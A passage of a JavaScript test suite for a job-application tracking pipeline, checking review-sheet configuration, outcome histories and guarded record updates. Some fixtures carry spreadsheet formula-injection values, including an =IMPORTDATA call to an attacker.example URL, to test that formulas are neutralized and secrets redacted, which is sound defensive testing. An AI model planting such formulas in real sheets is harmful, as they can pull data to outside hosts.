import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import test from "node:test";

import {
  applyManualAction as applyManualActionCore,
  buildAppliedJobsProjection,
  buildFunnelSummary,
  buildReviewQueue,
  buildReviewQueueProjection,
  finalizeAppliedJobsCleanup,
  reasonForReview,
  reconcileAppliedJobs,
  reconcileReviewQueue,
  validateAppliedJobsConfig,
  validateReviewQueueConfig,
  processReviewActions as processReviewActionsCore
} from "../src/review.mjs";
import { mergeOutcomeEvents, stateGuard } from "../src/contracts.mjs";

const loadJson = async (path) => JSON.parse(await readFile(new URL(path, import.meta.url), "utf8"));
const schema = await loadJson("../config/pipeline-schema.json");
const view = await loadJson("../config/review-sheet.json");
const profile = await loadJson("../config/candidate-profile.json");
const applicationPolicy = await loadJson(
  "../config/application-policy.json"
);
const packPolicy = await loadJson(
  "../config/application-pack-policy.json"
);
const messageSafetyContext = {
  profile,
  applicationPolicy,
  packPolicy
};
const now = "2026-07-28T10:00:00.000Z";
const applyManualAction = (record, usedSchema, at) =>
  applyManualActionCore(
    record,
    usedSchema,
    at,
    messageSafetyContext
  );
const processReviewActions = (
  activeRows,
  archiveRows,
  usedSchema,
  at,
  queueContext
) =>
  processReviewActionsCore(
    activeRows,
    archiveRows,
    usedSchema,
    at,
    messageSafetyContext,
    queueContext
  );

const job = (overrides = {}) => ({
  row_number: 2,
  source: "onlinejobs.ph",
  source_job_id: "6001",
  canonical_job_id: "onlinejobs.ph:6001",
  canonical_url: "https://onlinejobs.ph/jobseekers/job/example-6001",
  job_title: "TypeScript Developer",
  posted_at: "2026-07-27T10:00:00.000Z",
  pipeline_status: "ready",
  match_score: 75,
  qualification_score: 82,
  opportunity_score: 78,
  ranking_confidence: "medium",
  apply_points_recommendation: "normal_allocation",
  scoring_policy_version: "2026-07-28/v1",
  match_tier: "direct",
  match_reasons: ["Matched skill: TypeScript"],
  requirement_gaps: [],
  generated_message: "Copy-ready message",
  message_profile_version: profile.profile_version,
  message_policy_version: applicationPolicy.policy_version,
  message_validation_status: "valid",
  application_instructions: [],
  screening_questions: [],
  selected_proof_refs: [
    "experience:upwork",
    "projects:job-pipeline"
  ],
  application_warnings: [],
  application_pack_status: "ready",
  application_pack_version: packPolicy.pack_version,
  application_pack_profile_version: profile.profile_version,
  application_pack_policy_version: packPolicy.policy_version,
  application_pack_generated_at: now,
  outcome_events: [],
  application_decision: "",
  outcome: "",
  manual_action: "",
  ...overrides
});

test("review configuration exposes required information and controlled actions", () => {
  assert.deepEqual(validateReviewQueueConfig(view, schema), []);
  assert.deepEqual(validateAppliedJobsConfig(view, schema), []);
  assert.equal(view.review_queue.sheet, "Review Queue");
  assert.deepEqual(view.review_queue.visible_columns, [
    "Status",
    "Job title",
    "Company",
    "Score",
    "Reason for review",
    "Generated message",
    "Job link",
    "Action"
  ]);
  assert.deepEqual(view.review_queue.hidden_columns, [
    "canonical_job_id",
    "source_state_guard"
  ]);
  assert.deepEqual(view.review_queue.actions, {
    "Generate Application": "promote",
    "I Applied": "mark_applied",
    Skip: "mark_skipped"
  });
  assert.deepEqual(view.review_queue.generation_recovery, {
    statuses: ["retryable_error", "terminal_error"],
    failed_stage: "generation"
  });
  assert.equal(view.applied_jobs.sheet, "Applied Jobs");
  assert.deepEqual(view.applied_jobs.visible_columns, [
    "Applied at",
    "Job title",
    "Company",
    "Generated message",
    "Job link",
    "Current outcome",
    "Outcome updated at",
    "Action"
  ]);
  assert.deepEqual(view.applied_jobs.hidden_columns, [
    "canonical_job_id",
    "source_state_guard"
  ]);
  assert.deepEqual(view.applied_jobs.actions, {
    "No Response": "outcome_no_response",
    Replied: "outcome_replied",
    Interview: "outcome_interview",
    Offer: "outcome_offer",
    Rejected: "outcome_rejected",
    "Clear Outcome": "clear_outcome"
  });
  for (const field of [
    "job_title",
    "company",
    "canonical_url",
    "posted_at",
    "salary_text",
    "qualification_score",
    "opportunity_score",
    "ranking_confidence",
    "apply_points_recommendation",
    "application_pack_status",
    "application_instructions",
    "screening_questions",
    "selected_proof_refs",
    "application_warnings",
    "match_score",
    "match_tier",
    "match_reasons",
    "requirement_gaps",
    "pipeline_status",
    "generated_message",
    "manual_action",
    "application_decision",
    "outcome"
  ]) {
    assert.ok(view.review_columns.includes(field), `missing review column ${field}`);
  }
  assert.deepEqual(view.editable_columns, [
    "apply_points_input",
    "application_message_strategy_input",
    "manual_action",
    "notes"
  ]);
  assert.deepEqual(view.hidden_columns, [
    "state_guard",
    "processing_commit_guard",
    "processing_token"
  ]);
  assert.ok(view.manual_action_dropdown.includes("promote"));
  assert.ok(view.manual_action_dropdown.includes("mark_reviewed"));
  assert.ok(view.manual_action_dropdown.includes("mark_applied"));
  assert.ok(view.manual_action_dropdown.includes("outcome_offer"));
});

test("Applied Jobs projects active and archived applications with active-source precedence", () => {
  const activeApplied = job({
    row_number: 4,
    source_job_id: "applied-1",
    canonical_job_id: "onlinejobs.ph:applied-1",
    pipeline_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-28T09:00:00.000Z",
    outcome: "interview",
    outcome_at: "2026-07-28T09:30:00.000Z"
  });
  activeApplied.state_guard = stateGuard(activeApplied);
  const overlappingArchive = {
    ...activeApplied,
    row_number: 20,
    pipeline_status: "archived",
    archived_from_status: "applied",
    archived_at: "2026-07-28T09:15:00.000Z",
    outcome: "replied",
    outcome_at: "2026-07-28T09:20:00.000Z"
  };
  overlappingArchive.state_guard = stateGuard(overlappingArchive);
  const archivedOffer = job({
    row_number: 21,
    source_job_id: "applied-2",
    canonical_job_id: "onlinejobs.ph:applied-2",
    pipeline_status: "archived",
    archived_from_status: "applied",
    archived_at: "2026-07-28T08:30:00.000Z",
    application_decision: "applied",
    application_decided_at: "2026-07-28T08:00:00.000Z",
    outcome: "offer",
    outcome_at: "2026-07-28T10:00:00.000Z"
  });
  archivedOffer.state_guard = stateGuard(archivedOffer);
  const legacyApplied = job({
    row_number: 22,
    source_job_id: "applied-3",
    canonical_job_id: "onlinejobs.ph:applied-3",
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    application_decided_at: "",
    generated_message: "",
    outcome: "",
    outcome_at: ""
  });
  legacyApplied.state_guard = stateGuard(legacyApplied);
  const excluded = [
    job({
      source_job_id: "ready-not-applied",
      canonical_job_id: "onlinejobs.ph:ready-not-applied"
    }),
    job({
      source_job_id: "skipped",
      canonical_job_id: "onlinejobs.ph:skipped",
      pipeline_status: "skipped",
      application_decision: "skipped"
    }),
    job({
      source_job_id: "archived-not-applied",
      canonical_job_id: "onlinejobs.ph:archived-not-applied",
      pipeline_status: "archived",
      archived_from_status: "not_recommended",
      application_decision: ""
    })
  ];

  const projection = buildAppliedJobsProjection(
    [activeApplied, ...excluded.slice(0, 2)],
    [
      overlappingArchive,
      archivedOffer,
      legacyApplied,
      excluded[2]
    ],
    schema,
    view,
    now
  );
  assert.deepEqual(
    projection.rows.map((row) => row.canonical_job_id),
    [
      "onlinejobs.ph:applied-1",
      "onlinejobs.ph:applied-2",
      "onlinejobs.ph:applied-3"
    ]
  );
  assert.deepEqual(Object.keys(projection.rows[0]), view.applied_jobs.fields);
  assert.equal(projection.rows[0]["Current outcome"], "interview");
  assert.equal(
    projection.rows[0].source_state_guard,
    activeApplied.state_guard
  );
  assert.equal(projection.rows[1]["Current outcome"], "offer");
  assert.equal(projection.rows[2]["Applied at"], "");
  assert.equal(projection.rows[2]["Generated message"], "");
  assert.equal(projection.invalid_records.length, 0);
});

test("Applied Jobs fails closed for ambiguous identities and neutralizes formulas", () => {
  const duplicate = job({
    row_number: 7,
    source_job_id: "applied-duplicate",
    canonical_job_id: "onlinejobs.ph:applied-duplicate",
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-28T07:00:00.000Z"
  });
  const missingIdentity = job({
    row_number: 8,
    source: "",
    source_job_id: "",
    canonical_job_id: "",
    canonical_url: "",
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied"
  });
  const formulaLike = job({
    row_number: 9,
    source_job_id: "applied-formula",
    canonical_job_id: "onlinejobs.ph:applied-formula",
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-28T06:00:00.000Z",
    job_title: "\t\u200b=IMPORTDATA(\"https://attacker.example/title\")",
    company: "\u00a0+malicious",
    generated_message: "\ufeff@malicious",
    canonical_url: "-malicious",
    outcome: "replied"
  });
  formulaLike.state_guard = stateGuard(formulaLike);
  const invalidIdentity = job({
    row_number: 11,
    source_job_id: "",
    canonical_job_id:
      "=token=do-not-log https://attacker.example/private",
    canonical_url: "",
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied"
  });
  const staleGuard = job({
    row_number: 12,
    source_job_id: "applied-stale-guard",
    canonical_job_id: "onlinejobs.ph:applied-stale-guard",
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    outcome: "offer",
    state_guard: "onlinejobs.ph:applied-stale-guard|stale"
  });
  const invalidActiveArchiveFallback = {
    ...staleGuard,
    row_number: 13,
    pipeline_status: "archived",
    archived_from_status: "applied",
    state_guard: ""
  };
  invalidActiveArchiveFallback.state_guard = stateGuard(
    invalidActiveArchiveFallback
  );
  const projection = buildAppliedJobsProjection(
    [staleGuard],
    [
      duplicate,
      { ...duplicate, row_number: 10 },
      missingIdentity,
      formulaLike,
      invalidIdentity,
      invalidActiveArchiveFallback
    ],
    schema,
    view,
    now
  );
  assert.equal(projection.rows.length, 1);
  assert.match(projection.rows[0]["Job title"], /^'\t\u200b=/);
  assert.match(projection.rows[0].Company, /^'\u00a0\+/);
  assert.match(projection.rows[0]["Generated message"], /^'\ufeff@/);
  assert.equal(projection.rows[0]["Job link"], "");
  assert.deepEqual(
    projection.invalid_records.map((entry) => entry.error).sort(),
    [
      "eligible applied record has duplicate canonical identity",
      "eligible applied record has invalid canonical identity",
      "eligible applied record is missing canonical identity",
      "source record has stale state guard"
    ]
  );
  const invalidIdentityDiagnostic = projection.invalid_records.find(
    (entry) => entry.error.includes("invalid canonical identity")
  );
  assert.doesNotMatch(
    invalidIdentityDiagnostic.canonical_job_id,
    /do-not-log|attacker\.example/
  );
  assert.match(
    invalidIdentityDiagnostic.canonical_job_id,
    /token=\[redacted\] \[url\]/
  );
});

test("Applied Jobs orders tied and invalid timestamps by canonical identity", () => {
  const applied = (identity, appliedAt, rowNumber) => {
    const record = job({
      row_number: rowNumber,
      source_job_id: identity.split(":").at(-1),
      canonical_job_id: identity,
      pipeline_status: "archived",
      archived_from_status: "applied",
      application_decision: "applied",
      application_decided_at: appliedAt
    });
    record.state_guard = stateGuard(record);
    return record;
  };
  const projection = buildAppliedJobsProjection(
    [],
    [
      applied("onlinejobs.ph:invalid-z", "not-a-date", 11),
      applied("onlinejobs.ph:tied-b", "2026-07-28T10:00:00.000Z", 12),
      applied("onlinejobs.ph:missing-a", "", 13),
      applied("onlinejobs.ph:tied-a", "2026-07-28T10:00:00.000Z", 14),
      applied("onlinejobs.ph:invalid-a", "also-not-a-date", 15)
    ],
    schema,
    view,
    now
  );
  assert.deepEqual(
    projection.rows.map((row) => row.canonical_job_id),
    [
      "onlinejobs.ph:tied-a",
      "onlinejobs.ph:tied-b",
      "onlinejobs.ph:invalid-a",
      "onlinejobs.ph:invalid-z",
      "onlinejobs.ph:missing-a"
    ]
  );
  assert.deepEqual(
    projection.rows.slice(2).map((row) => row["Applied at"]),
    ["", "", ""]
  );
});

test("first instrumented review is explicit and preserves its original timestamp", () => {
  const untouched = applyManualAction(job(), schema, now);
  assert.equal(untouched.record.first_reviewed_at, undefined);

  const first = applyManualAction(
    job({ manual_action: "mark_reviewed" }),
    schema,
    now
  );
  assert.equal(first.valid, true);
  assert.equal(first.record.first_reviewed_at, now);

  const repeatedAt = "2026-07-28T11:00:00.000Z";
  const repeated = applyManualAction(
    { ...first.record, manual_action: "mark_reviewed" },
    schema,
    repeatedAt
  );
  assert.equal(repeated.valid, true);
  assert.equal(repeated.record.first_reviewed_at, now);
  assert.equal(repeated.record.manual_action, "");
});

test("manual promotion and regeneration create one valid generation path", () => {
  const promoted = applyManualAction(
    job({ pipeline_status: "review_required", manual_action: "promote", generated_message: "" }),
    schema,
    now
  );
  assert.equal(promoted.valid, true);
  assert.equal(promoted.record.pipeline_status, "recommended");
  assert.equal(promoted.record.manual_action, "");

  const regenerated = applyManualAction(job({ manual_action: "regenerate" }), schema, now);
  assert.equal(regenerated.valid, true);
  assert.equal(regenerated.record.pipeline_status, "recommended");
  assert.equal(regenerated.record.generated_message, "Copy-ready message");
});

test("ready jobs can be applied or skipped only by an explicit action", () => {
  const unchanged = applyManualAction(job(), schema, now);
  assert.equal(unchanged.changed, false);
  assert.equal(unchanged.record.application_decision, "");

  const applied = applyManualAction(job({ manual_action: "mark_applied" }), schema, now);
  assert.equal(applied.record.pipeline_status, "applied");
  assert.equal(applied.record.application_decision, "applied");
  assert.equal(applied.record.application_decided_at, now);
  assert.equal(applied.record.first_reviewed_at, now);

  const skipped = applyManualAction(job({ manual_action: "mark_skipped" }), schema, now);
  assert.equal(skipped.record.pipeline_status, "skipped");
  assert.equal(skipped.record.application_decision, "skipped");
});

test("mark applied validates controlled inputs and freezes application context", () => {
  const source = job({
    apply_points_input: "10",
    application_message_strategy_input: "instruction-aware/v1",
    manual_action: "mark_applied"
  });
  const applied = applyManualAction(source, schema, now);
  assert.equal(applied.valid, true);
  assert.equal(applied.record.apply_points_used, 10);
  assert.equal(
    applied.record.application_message_strategy,
    "instruction-aware/v1"
  );
  assert.equal(applied.record.application_qualification_score, 82);
  assert.equal(applied.record.application_opportunity_score, 78);
  assert.equal(applied.record.application_ranking_confidence, "medium");
  assert.equal(
    applied.record.application_scoring_policy_version,
    "2026-07-28/v1"
  );
  assert.equal(
    applied.record.application_apply_points_recommendation,
    "normal_allocation"
  );
  assert.equal(applied.record.application_pack_status_at_apply, "ready");
  assert.equal(applied.record.application_posting_age_days, 1);
  assert.equal(applied.record.application_snapshot_at, now);
  assert.equal(applied.record.apply_points_input, "");
  assert.equal(applied.record.application_message_strategy_input, "");

  const later = applyManualAction(
    {
      ...applied.record,
      pipeline_status: "ready",
      application_decision: "",
      qualification_score: 30,
      opportunity_score: 20,
      application_pack_status: "ready",
      manual_action: "mark_applied"
    },
    schema,
    "2026-07-29T10:00:00.000Z"
  );
  assert.equal(later.valid, true);
  assert.equal(later.record.application_qualification_score, 82);
  assert.equal(later.record.application_opportunity_score, 78);
  assert.equal(later.record.application_pack_status_at_apply, "ready");
  assert.equal(later.record.application_snapshot_at, now);
});

test("mark applied rejects quarantined persisted content without mutating decision state", () => {
  const unsafe = job({
    generated_message:
      "I have a strong foundation. Resume: https://johnlesterescarlan.netlify.app/john_lester_escarlan_resume.pdf",
    message_profile_version: "legacy/unknown",
    message_policy_version: "",
    message_validation_status: "",
    application_pack_status: "",
    application_pack_version: "",
    application_pack_profile_version: "",
    application_pack_policy_version: "",
    application_pack_generated_at: "",
    manual_action: "mark_applied"
  });
  const snapshot = structuredClone(unsafe);
  const denied = applyManualAction(unsafe, schema, now);
  assert.equal(denied.valid, false);
  assert.equal(denied.changed, false);
  assert.match(denied.error, /^message_quarantined:/);
  assert.deepEqual(denied.record, snapshot);
  assert.equal(denied.record.application_decision, "");
  assert.equal(denied.record.application_decided_at, undefined);
  assert.equal(denied.record.application_snapshot_at, undefined);
});

test("unknown points stay unknown and invalid application input is atomic", () => {
  const unknown = applyManualAction(
    job({ manual_action: "mark_applied" }),
    schema,
    now
  );
  assert.equal(unknown.valid, true);
  assert.equal(unknown.record.apply_points_used, "");

  for (const invalidPoints of [0, 61, 1.5, "not-a-number"]) {
    const original = job({
      apply_points_input: invalidPoints,
      manual_action: "mark_applied"
    });
    const result = applyManualAction(original, schema, now);
    assert.equal(result.valid, false);
    assert.deepEqual(result.record, original);
    assert.match(result.error, /integer from 1 to 60/);
  }

  const maliciousStrategy = job({
    apply_points_input: 5,
    application_message_strategy_input: "token=secret value",
    manual_action: "mark_applied"
  });
  const invalidStrategy = applyManualAction(maliciousStrategy, schema, now);
  assert.equal(invalidStrategy.valid, false);
  assert.deepEqual(invalidStrategy.record, maliciousStrategy);
  assert.doesNotMatch(invalidStrategy.error, /secret/);
});

test("duplicate application decisions preserve their original timestamp and snapshot", () => {
  const applied = applyManualAction(
    job({
      apply_points_input: 8,
      application_message_strategy_input: "instruction-aware/v1",
      manual_action: "mark_applied"
    }),
    schema,
    now
  ).record;
  const repeated = applyManualAction(
    {
      ...applied,
      apply_points_input: 60,
      application_message_strategy_input: "manual-custom/v2",
      manual_action: "mark_applied"
    },
    schema,
    "2026-07-29T10:00:00.000Z"
  );
  assert.equal(repeated.valid, true);
  assert.equal(repeated.record.application_decided_at, now);
  assert.equal(repeated.record.application_snapshot_at, now);
  assert.equal(repeated.record.apply_points_used, 8);
  assert.equal(
    repeated.record.application_message_strategy,
    "instruction-aware/v1"
  );
  assert.equal(repeated.record.apply_points_input, "");

  const skipped = applyManualAction(
    job({ manual_action: "mark_skipped" }),
    schema,
    now
  ).record;
  const skippedAgain = applyManualAction(
    { ...skipped, manual_action: "mark_skipped" },
    schema,
    "2026-07-29T10:00:00.000Z"
  );
  assert.equal(skippedAgain.record.application_decided_at, now);
});

test("outcomes require an applied decision and preserve application history", () => {
  const applied = job({
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z",
    manual_action: "outcome_interview"
  });
  const result = applyManualAction(applied, schema, now);
  assert.equal(result.valid, true);
  assert.equal(result.record.outcome, "interview");
  assert.equal(result.record.outcome_at, now);
  assert.equal(result.record.application_decision, "applied");
  assert.equal(result.record.application_decided_at, applied.application_decided_at);
  assert.equal(result.record.generated_message, applied.generated_message);
  assert.deepEqual(
    result.record.outcome_events.map((event) => event.type),
    ["interview"]
  );

  const invalid = applyManualAction(
    job({ application_decision: "skipped", manual_action: "outcome_offer" }),
    schema,
    now
  );
  assert.equal(invalid.valid, false);
  assert.equal(invalid.record.outcome, "");
});

test("progressive outcomes and corrections preserve cumulative audit evidence", () => {
  const applied = job({
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z"
  });
  const replied = applyManualAction(
    { ...applied, manual_action: "outcome_replied" },
    schema,
    "2026-07-28T10:00:00.000Z"
  ).record;
  const repeatedReply = applyManualAction(
    { ...replied, manual_action: "outcome_replied" },
    schema,
    "2026-07-28T11:00:00.000Z"
  ).record;
  assert.equal(repeatedReply.outcome_events.length, 1);
  assert.equal(repeatedReply.outcome_at, "2026-07-28T10:00:00.000Z");
  const interviewed = applyManualAction(
    { ...repeatedReply, manual_action: "outcome_interview" },
    schema,
    "2026-07-29T10:00:00.000Z"
  ).record;
  const rejected = applyManualAction(
    { ...interviewed, manual_action: "outcome_rejected" },
    schema,
    "2026-07-30T10:00:00.000Z"
  ).record;
  assert.equal(rejected.outcome, "rejected");
  assert.deepEqual(
    rejected.outcome_events.map((event) => event.type),
    ["replied", "interview", "rejected"]
  );

  const cleared = applyManualAction(
    { ...rejected, manual_action: "clear_outcome" },
    schema,
    "2026-07-31T10:00:00.000Z"
  ).record;
  assert.equal(cleared.outcome, "");
  assert.deepEqual(
    cleared.outcome_events.map((event) => event.type),
    ["replied", "interview", "rejected", "correction"]
  );
  assert.equal(cleared.outcome_events.at(-1).previous_outcome, "rejected");

  const repeated = applyManualAction(
    { ...cleared, manual_action: "clear_outcome" },
    schema,
    "2026-08-01T10:00:00.000Z"
  ).record;
  assert.equal(repeated.outcome_events.length, 4);
  assert.equal(repeated.outcome_at, cleared.outcome_at);
});

test("concurrent outcome histories merge without losing distinct milestones", () => {
  const base = job({
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied"
  });
  const replied = applyManualAction(
    { ...base, manual_action: "outcome_replied" },
    schema,
    "2026-07-28T10:00:00.000Z"
  ).record;
  const interviewed = applyManualAction(
    { ...base, manual_action: "outcome_interview" },
    schema,
    "2026-07-28T10:00:01.000Z"
  ).record;
  const merged = mergeOutcomeEvents(
    replied.outcome_events,
    interviewed.outcome_events,
    replied.outcome_events
  );
  assert.deepEqual(
    merged.map((event) => event.type),
    ["replied", "interview"]
  );
});

test("a manual decision changes the guard and invalidates a stale automated claim", () => {
  const original = job({
    processing_stage: "generation",
    processing_token: "stale-token",
    processing_commit_guard: "commit:stale-token",
    processing_started_at: "2026-07-28T09:59:00.000Z"
  });
  original.state_guard = stateGuard(original);
  const applied = applyManualAction(
    { ...original, manual_action: "mark_applied" },
    schema,
    now
  ).record;
  assert.notEqual(applied.state_guard, original.state_guard);
  assert.equal(applied.processing_token, "");
  assert.equal(applied.processing_commit_guard, "");
  assert.equal(applied.processing_stage, "");
});

test("unsupported and invalid actions do not erase the previous record", () => {
  const original = job({ manual_action: "delete_everything", outcome: "replied" });
  const unsupported = applyManualAction(original, schema, now);
  assert.equal(unsupported.valid, false);
  assert.deepEqual(unsupported.record, original);

  const invalidTransition = applyManualAction(
    job({ pipeline_status: "review_required", manual_action: "mark_applied" }),
    schema,
    now
  );
  assert.equal(invalidTransition.valid, false);
  assert.equal(invalidTransition.record.pipeline_status, "review_required");

  const invalidInput = processReviewActions(
    [
      job({
        apply_points_input: 99,
        application_message_strategy_input: "token=do-not-log",
        manual_action: "mark_applied"
      })
    ],
    [],
    schema,
    now
  );
  assert.deepEqual(invalidInput.active_updates, []);
  assert.equal(invalidInput.invalid_actions.length, 1);
  assert.doesNotMatch(JSON.stringify(invalidInput.invalid_actions), /do-not-log/);

  const malformedHistory = job({
    pipeline_status: "archived",
    archived_from_status: "applied",
    application_decision: "applied",
    outcome_events: "not-json",
    manual_action: "outcome_replied"
  });
  const malformed = applyManualAction(malformedHistory, schema, now);
  assert.equal(malformed.valid, false);
  assert.deepEqual(malformed.record, malformedHistory);
});

test("active and archived action processing stay in their ownership boundary", () => {
  const processed = processReviewActions(
    [job({ manual_action: "mark_applied" })],
    [
      job({
        row_number: 10,
        source_job_id: "archived-boundary",
        canonical_job_id: "onlinejobs.ph:archived-boundary",
        pipeline_status: "archived",
        archived_from_status: "applied",
        application_decision: "applied",
        manual_action: "outcome_replied"
      })
    ],
    schema,
    now
  );
  assert.equal(processed.active_updates.length, 1);
  assert.equal(processed.active_claims.length, 1);
  assert.equal(processed.archive_updates.length, 1);
  assert.equal(processed.archive_claims.length, 1);
  assert.equal(processed.archive_updates[0].outcome, "replied");
  assert.match(
    processed.archive_updates[0].processing_commit_guard,
    /^commit:review:/
  );
  assert.deepEqual(processed.invalid_actions, []);
});

test("Applied Jobs actions update guarded active or archived authoritative records", () => {
  const activeApplied = job({
    row_number: 31,
    source_job_id: "applied-action-active",
    canonical_job_id: "onlinejobs.ph:applied-action-active",
    pipeline_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z",
    application_snapshot_at: "2026-07-27T10:00:00.000Z",
    outcome: "",
    outcome_at: "",
    outcome_events: []
  });
  activeApplied.state_guard = stateGuard(activeApplied);
  const activeResult = processReviewActions(
    [activeApplied],
    [],
    schema,
    now,
    {
      executionId: "applied-active",
      reviewConfig: view,
      appliedJobsRows: [
        {
          row_number: 5,
          Action: "Replied",
          canonical_job_id: activeApplied.canonical_job_id,
          source_state_guard: activeApplied.state_guard
        }
      ]
    }
  );
  assert.deepEqual(activeResult.invalid_actions, []);
  assert.equal(activeResult.active_claims.length, 1);
  assert.equal(activeResult.archive_claims.length, 0);
  assert.equal(activeResult.active_updates[0].outcome, "replied");
  assert.equal(activeResult.active_updates[0].outcome_at, now);
  assert.deepEqual(
    activeResult.active_updates[0].outcome_events.map((event) => event.type),
    ["replied"]
  );
  assert.equal(
    activeResult.active_updates[0].application_decided_at,
    activeApplied.application_decided_at
  );
  assert.equal(
    activeResult.active_updates[0].application_snapshot_at,
    activeApplied.application_snapshot_at
  );
  assert.equal(
    activeResult.active_updates[0].generated_message,
    activeApplied.generated_message
  );
  assert.equal(activeResult.processed_applied_actions.length, 1);
  assert.equal(
    activeResult.processed_applied_actions[0].source_location,
    "active"
  );
  assert.match(
    activeResult.active_claims[0].processing_commit_guard,
    /^commit:review:onlinejobs\.ph:applied-action-active:/
  );

  const archivedApplied = job({
    row_number: 41,
    source_job_id: "applied-action-archive",
    canonical_job_id: "onlinejobs.ph:applied-action-archive",
    pipeline_status: "archived",
    archived_from_status: "applied",
    archived_at: "2026-07-27T11:00:00.000Z",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z",
    application_snapshot_at: "2026-07-27T10:00:00.000Z",
    outcome: "interview",
    outcome_at: "2026-07-28T08:00:00.000Z",
    outcome_events: [
      {
        id: "interview-1",
        type: "interview",
        at: "2026-07-28T08:00:00.000Z"
      }
    ]
  });
  archivedApplied.state_guard = stateGuard(archivedApplied);
  const archiveResult = processReviewActions(
    [],
    [archivedApplied],
    schema,
    now,
    {
      executionId: "applied-archive",
      reviewConfig: view,
      appliedJobsRows: [
        {
          row_number: 6,
          Action: "Offer",
          canonical_job_id: archivedApplied.canonical_job_id,
          source_state_guard: archivedApplied.state_guard
        }
      ]
    }
  );
  assert.deepEqual(archiveResult.invalid_actions, []);
  assert.equal(archiveResult.active_claims.length, 0);
  assert.equal(archiveResult.archive_claims.length, 1);
  assert.equal(
    archiveResult.archive_claims[0].state_guard,
    archivedApplied.state_guard
  );
  assert.equal(archiveResult.archive_updates[0].outcome, "offer");
  assert.equal(
    archiveResult.archive_updates[0].archived_at,
    archivedApplied.archived_at
  );
  assert.deepEqual(
    archiveResult.archive_updates[0].outcome_events.map((event) => event.type),
    ["interview", "offer"]
  );
  assert.equal(
    archiveResult.processed_applied_actions[0].source_location,
    "archive"
  );
  assert.match(
    archiveResult.archive_claims[0].processing_commit_guard,
    /^commit:review:onlinejobs\.ph:applied-action-archive:/
  );
  assert.notEqual(
    activeResult.active_claims[0].processing_commit_guard,
    archiveResult.archive_claims[0].processing_commit_guard
  );
});

test("Applied Jobs uses active precedence and direct source actions win conflicts", () => {
  const activeApplied = job({
    row_number: 51,
    source_job_id: "applied-overlap",
    canonical_job_id: "onlinejobs.ph:applied-overlap",
    pipeline_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z",
    outcome: ""
  });
  activeApplied.state_guard = stateGuard(activeApplied);
  const archivedApplied = {
    ...activeApplied,
    row_number: 61,
    pipeline_status: "archived",
    archived_from_status: "applied",
    archived_at: "2026-07-27T11:00:00.000Z"
  };
  archivedApplied.state_guard = stateGuard(archivedApplied);
  const activeWins = processReviewActions(
    [activeApplied],
    [archivedApplied],
    schema,
    now,
    {
      executionId: "applied-overlap",
      reviewConfig: view,
      appliedJobsRows: [
        {
          row_number: 7,
          Action: "Interview",
          canonical_job_id: activeApplied.canonical_job_id,
          source_state_guard: activeApplied.state_guard
        }
      ]
    }
  );
  assert.equal(activeWins.active_updates.length, 1);
  assert.equal(activeWins.archive_updates.length, 0);
  assert.equal(activeWins.active_updates[0].outcome, "interview");

  const directWins = processReviewActions(
    [{ ...activeApplied, manual_action: "outcome_rejected" }],
    [archivedApplied],
    schema,
    now,
    {
      executionId: "applied-direct-conflict",
      reviewConfig: view,
      appliedJobsRows: [
        {
          row_number: 8,
          Action: "Offer",
          canonical_job_id: activeApplied.canonical_job_id,
          source_state_guard: activeApplied.state_guard
        }
      ]
    }
  );
  assert.equal(directWins.active_updates.length, 1);
  assert.equal(directWins.active_updates[0].outcome, "rejected");
  assert.equal(directWins.processed_applied_actions.length, 0);
  assert.equal(directWins.invalid_actions.length, 1);
  assert.match(directWins.invalid_actions[0].error, /conflicts with Sheet1/);

  const staleArchiveDirect = processReviewActions(
    [activeApplied],
    [{ ...archivedApplied, manual_action: "outcome_offer" }],
    schema,
    now,
    {
      executionId: "applied-archive-direct-overlap",
      reviewConfig: view
    }
  );
  assert.deepEqual(staleArchiveDirect.active_updates, []);
  assert.deepEqual(staleArchiveDirect.archive_updates, []);
  assert.equal(staleArchiveDirect.invalid_actions.length, 1);
  assert.equal(staleArchiveDirect.invalid_actions[0].location, "archive");
  assert.match(
    staleArchiveDirect.invalid_actions[0].error,
    /active authoritative source/
  );
});

test("Applied Jobs actions fail closed for stale, forged, malformed, and ambiguous state", () => {
  const applied = job({
    row_number: 71,
    source_job_id: "applied-invalid",
    canonical_job_id: "onlinejobs.ph:applied-invalid",
    pipeline_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z",
    outcome_events: []
  });
  applied.state_guard = stateGuard(applied);
  const action = (Action, sourceStateGuard = applied.state_guard) => ({
    row_number: 9,
    Action,
    canonical_job_id: applied.canonical_job_id,
    source_state_guard: sourceStateGuard
  });

  const stale = processReviewActions(
    [applied],
    [],
    schema,
    now,
    {
      executionId: "applied-stale",
      reviewConfig: view,
      appliedJobsRows: [action("Replied", "stale")]
    }
  );
  assert.deepEqual(stale.active_updates, []);
  assert.match(stale.invalid_actions[0].error, /stale Applied Jobs action/);

  const driftedSource = {
    ...applied,
    outcome: "offer",
    outcome_at: now,
    outcome_events: [{ id: "drifted-offer", type: "offer", at: now }]
  };
  const sourceGuardDrift = processReviewActions(
    [driftedSource],
    [],
    schema,
    now,
    {
      executionId: "applied-source-guard-drift",
      reviewConfig: view,
      appliedJobsRows: [action("Rejected")]
    }
  );
  assert.deepEqual(sourceGuardDrift.active_updates, []);
  assert.match(
    sourceGuardDrift.invalid_actions[0].error,
    /source state guard integrity mismatch/
  );

  const forged = processReviewActions(
    [applied],
    [],
    schema,
    now,
    {
      executionId: "applied-forged",
      reviewConfig: view,
      appliedJobsRows: [action("Delete Everything")]
    }
  );
